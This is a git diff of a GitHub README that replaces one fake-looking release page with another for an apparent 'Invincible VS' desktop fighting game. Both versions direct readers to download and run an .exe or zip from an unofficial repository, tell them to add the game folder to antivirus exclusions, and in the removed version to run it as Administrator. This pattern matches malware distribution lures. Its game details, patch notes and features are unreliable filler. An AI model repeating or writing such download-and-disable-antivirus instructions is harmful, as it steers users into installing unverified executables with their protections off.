@@ -1,43 +1,81 @@
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/45ee0fe9-7329-4e6c-a4ee-0cfc363f217a" />
+# 🥊 Invincible-VS-Game-Release-Desktop - Experience tactical hero combat on PC
 
-# Invincible VS Release Game
+[![](https://img.shields.io/badge/Download-Game_Installer-blue.svg)](https://github.com/Joripremature506/Invincible-VS-Game-Release-Desktop)
 
-> **Invincible VS** — Epic superhero fighting game based on the Invincible universe. Intense battles with brutal combat, iconic characters, and faithful animation style.
+## 📥 How to download the game
 
-[![Stars](https://img.shields.io/github/stars/MasnoNi/Invincible-VS-Game-Release-Desktop)](https://github.com/MasnoNi/Invincible-VS-Game-Release-Desktop) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+Follow these steps to install Invincible-VS-Game-Release-Desktop on your Windows computer.
 
-**Invincible VS Release Game** is the full desktop version of the highly anticipated fighting game set in the Invincible universe. Experience brutal, fast-paced combat with accurate character abilities, stunning animations, and the signature violence of the Invincible series.
+1. Go to the [official release page](https://github.com/Joripremature506/Invincible-VS-Game-Release-Desktop).
+2. Look for the section labeled Releases or Assets.
+3. Select the file ending in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the downloaded file to begin the installation process.
+6. Follow the on-screen prompts to finish the setup.
 
+## 🖥️ System requirements
 
----
-## 📦 What's Included
+Ensure your computer meets these specifications for smooth gameplay.
 
-- Optimized build for Windows 10/11
-- High resolution and widescreen support
-- Improved performance and stability
-- Keyboard and controller support
-- All characters and stages from the release version
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or AMD Ryzen 5 series.
+*   **Memory:** 8 GB RAM.
+*   **Graphics:** NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.
+*   **Storage:** 20 GB of available space.
+*   **DirectX:** Version 12.
 
----
-## 📥 Download
-📥 [`InvincibleVS.zip`](https://github.com/MasnoNi/Invincible-VS-Game-Release-Desktop/releases/download/Game-Addons/InvincibleVS.zip)
----
-> ℹ️ Optimized for Windows 10 and Windows 11.
+## 🎮 Gameplay features
 
----
-## ❗️ Troubleshooting
-| Problem                  | Solution                                      |
-|--------------------------|-----------------------------------------------|
-| Game doesn't start       | Run as Administrator                          |
-| Low FPS                  | Lower graphics settings                       |
-| Black screen             | Switch to Borderless Windowed mode            |
-| Antivirus warning        | Add the folder to exclusions                  |
-| Controller issues        | Enable controller support in settings         |
+This desktop version provides a full fighting experience. Players engage in 3v3 tag combat. You switch between team members during the match to create complex combos. The game engine supports high frame rates for responsive inputs.
 
----
-## 📜 License
-MIT License – shared for educational and game preservation purposes only.
+*   **Character Roster:** Select from iconic heroes and villains including Omni-Man, Atom Eve, and Robot.
+*   **Combo System:** Practice inputs in the training room to link light, medium, and heavy attacks.
+*   **Arcade Support:** The software detects most standard arcade sticks and gamepads automatically.
+*   **Performance Mode:** Use the graphics menu to adjust resolution and texture quality if you experience low frame rates.
 
----
-## ⭐️ Support
-If **Invincible VS Release Game** delivered the brutal and epic fights you were waiting for — please star the repository! It helps more fans enjoy the game on PC. ❤️
+## ⚙️ Troubleshooting common issues
+
+If you face technical difficulties, try these steps.
+
+*   **D3D Errors:** Update your GPU drivers using the manufacturer website. Ensure your system meets the DirectX 12 requirements.
+*   **Stuttering:** Close background applications like web browsers or video streaming software before you launch the game. Lower the visual settings in the options menu.
+*   **Controller Not Detected:** Plug your controller into a different USB port. Restart the game after you connect the device to force a device refresh.
+*   **Game Won't Launch:** Add an exception for the game folder in your antivirus or firewall settings. Run the installer again if a file appears missing.
+
+## ⌨️ Combat controls
+
+Use these default keyboard inputs for matches. You can rebind these keys in the settings menu.
+
+*   **Move Character:** W, A, S, D
+*   **Light Attack:** J
+*   **Medium Attack:** K
+*   **Heavy Attack:** L
+*   **Tag Character:** U
+*   **Special Ability:** I
+*   **Block:** Spacebar
+
+## 📝 Patch notes
+
+The day one patch improves stability and game balance.
+
+*   Fixed crashes on startup related to DirectX initialization.
+*   Adjusted hitboxes for Omni-Man to fix clipping issues.
+*   Improved input buffer for combo sequences.
+*   Updated local localization settings for better text display.
+*   Optimized asset loading to reduce wait times between rounds.
+
+## 💡 Pro tips for beginners
+
+Understand the mechanics to improve your win rate.
+
+*   **Learn Tagging:** You swap characters mid-combo to extend your damage output. Press the tag button early to keep your opponent locked in the air.
+*   **Manage Resources:** Every special move consumes energy. Watch the gauge at the bottom of the screen.
+*   **Defense Matters:** You recover health slowly when you rotate characters correctly. Keep your health bars balanced across your team.
+*   **Practice Mode:** Spend time in the training room. Turn on the input display to see your button presses in real-time. This helps you master the move list.
+*   **Character Passes:** Check the store menu periodically for new content, including Zero Suit skins and bonus legendary characters.
+
+## 📡 Support and updates
+
+The development team provides updates to improve performance. Check the repository for the latest version number. If you find a bug, document the error message and the hardware you use. This helps engineers find a fix for everyone. The character pass system integrates with the base game files to bring new fighters to your list without extra downloads. Follow the repository for news on upcoming tournaments and balance changes. Your feedback contributes to better balance and a more enjoyable competitive environment. 
+
+You can run the game directly from the shortcut created on your desktop after the initial installation. Ensure you quit the game completely before you install any updates to avoid file corruption. If your performance feels low, verify that your computer power settings are set to High Performance mode in the Windows control panel. This ensures your hardware runs at expected speeds during intensive combat sequences.
